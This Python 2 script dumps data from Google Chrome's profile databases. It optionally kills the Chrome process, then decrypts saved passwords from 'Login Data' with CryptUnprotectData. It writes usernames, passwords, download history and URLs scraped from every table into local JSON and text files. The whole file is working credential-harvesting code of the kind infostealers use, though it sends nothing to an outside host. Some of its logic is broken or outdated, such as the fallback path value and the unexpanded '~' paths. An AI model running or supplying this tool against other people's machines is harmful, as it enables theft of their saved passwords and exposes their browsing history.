import sqlite3
import argparse
import os
from pandas import read_sql_query
from re import findall
from psutil import process_iter
from difflib import SequenceMatcher
import win32crypt
import json

PROCESS_NAME = ['chrome.exe', 'chrome']
PATH_WINDOWS_VISTA_AND_LATER = 'C:\\Users\\' + os.getenv(
    'username') + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\'
PATH_WINDOWS_XP = 'C:\\Documents and Settings\\' + os.getenv(
    'username') + '\\Application Support\\Google\\Chrome\\Default\\'
PATH_MAC_OS_X = '~/Library/Application Support/Google/Chrome/Default/'
PATH_LINUX = '~/.config/google-chrome/Default/'

DATA_FILES = ['History', 'Favicons', 'Cookies', 'Top Sites',
              'Visited Links', 'Web Data', 'Shortcuts', 'Last Session',
              'Last Tabs', 'Network Action Predictor', 'Current Tabs',
              'Preferences', 'Current Session', 'TransportSecurity',
              'TransportSecurity', 'Login Data', 'Origin Bound Certs',
              'Bookmarks', 'QuotaManager', 'Extension Cookies']

ALL_FILES = set([])


def generate_all_files(path):
    global ALL_FILES
    for root, dirs, files in os.walk(path):
        ALL_FILES = ALL_FILES.union(files)


def dump_user_pass(path):
    data = ([], [])
    conn = sqlite3.connect(path + 'Login Data')
    cursor = conn.cursor()
    cursor.execute(
        'SELECT username_value, action_url, times_used, signon_realm, origin_url, password_element, password_value, date_created FROM logins')
    for result in cursor.fetchall():
        password = win32crypt.CryptUnprotectData(result[6], None, None, None, 0)[1]
        if password:
            result = list(result)
            result.pop(6)
            result.insert(6, password)
            data[0].append(result)
        else:
            result = list(result)
            result.pop(6)
            data[1].append(result)
    return data


def dump_users(path):
    data = []
    conn = sqlite3.connect(path + 'Login Data')
    cursor = conn.cursor()
    cursor.execute(
        'SELECT username_value, update_time, origin_domain FROM stats')
    for result in cursor.fetchall():
        data.append(result)
    return data


def dump_downloads(path):
    data = []
    conn = sqlite3.connect(path + 'History')
    cursor = conn.cursor()
    cursor.execute(
        'SELECT tab_url, http_method, opened, site_url, last_access_time, start_time, tab_referrer_url, last_modified, by_ext_name, original_mime_type, referrer, current_path, target_path, transient FROM downloads')
    for result in cursor.fetchall():
        data.append(result)
    return data


def fuzzy_search(name1, name2, strictness):
    similarity = SequenceMatcher(None, name1, name2)
    return similarity.ratio() > strictness


def kill_process():
    for p in process_iter():
        for name in PROCESS_NAME:
            if fuzzy_search(p.name(), name, 0.9):
                p.kill()


def get_os_path():
    import platform
    print platform.system(), type(platform.system())
    operating_system = platform.system().upper()
    if 'WINDOWS' in operating_system:
        operating_system += platform.release().upper()
    return {
        'WINDOWS10': PATH_WINDOWS_VISTA_AND_LATER,
        'WINDOWS8.1': PATH_WINDOWS_VISTA_AND_LATER,
        'WINDOWS8': PATH_WINDOWS_VISTA_AND_LATER,
        'WINDOWS7': PATH_WINDOWS_VISTA_AND_LATER,
        'WINDOWSVISTA': PATH_WINDOWS_VISTA_AND_LATER,
        'WINDOWSXP': PATH_WINDOWS_XP,
        'MAC': PATH_MAC_OS_X,
        'LINUX': PATH_LINUX
    }.get(operating_system, 'WINDOWS10')


def generate_urls(path, files):
    urls = set([])
    counter = 0
    for f in files:
        try:
            counter += 1
            if not (counter % (len(files) / 10)):
                print "*LOGGING*\tgenerate_urls: {}%".format((float(counter) / len(files)) * 100)

            db = sqlite3.connect(path + f)
            cursor = db.cursor()
            cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
            tables = cursor.fetchall()
            for table_name in tables:
                table_name = table_name[0]
                table = read_sql_query("SELECT * from %s" % table_name, db)
                new_urls = findall(
                    '[\d\w/.-:]+[\.][a-zA-Z][\d\w/.-]+[-/, ]',
                    table.to_string())
                urls = urls.union(new_urls)
                # print 'File:{:15}Success'.format(f)
        except sqlite3.DatabaseError, e:
            print '*LOGGING*\tgenerate_urls: {:30}File: {:30}Failed: {:30}'.format(
                str((float(counter) / len(files)) * 100) + '%', f,
                e)
    print "*LOGGING*\tgenerate_urls: {}%".format(100.0)
    return urls




def dump_data(kill_chrome, deep):
    if kill_chrome:
        kill_process()
    path = get_os_path()

    with open('chrome_downloads.json', 'w') as f:
        json.dump(dump_downloads(path=path), f)
    with open('chrome_user_pass.json', 'w') as f:
        json.dump(dump_user_pass(path=path), f)
    with open('chrome_users.json', 'w') as f:
        json.dump(dump_users(path=path), f)

    if deep:
        generate_all_files(path=path)
        urls = generate_urls(path=path, files=ALL_FILES)
    else:
        urls = generate_urls(path=path, files=DATA_FILES)

    with open('chrome_urls.txt', 'w') as f:
        for url in urls:
            f.write("%s\n" % url)
        print "*LOGGING*\tdump_data: {:5}%".format(100.0)


def main(kill_chrome, deep):
    dump_data(kill_chrome=int(kill_chrome), deep=int(deep))


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Dump information from google-chrome browser databases')
    parser.add_argument('-k', '--kill', type=str, help='kill chrome process', required=False, default='0',
                        dest='kill_chrome')
    parser.add_argument('-d', '--deep', type=str, help='deep dump', required=False, default='0', dest='deep')
    args = parser.parse_args()

    main(**vars(args))
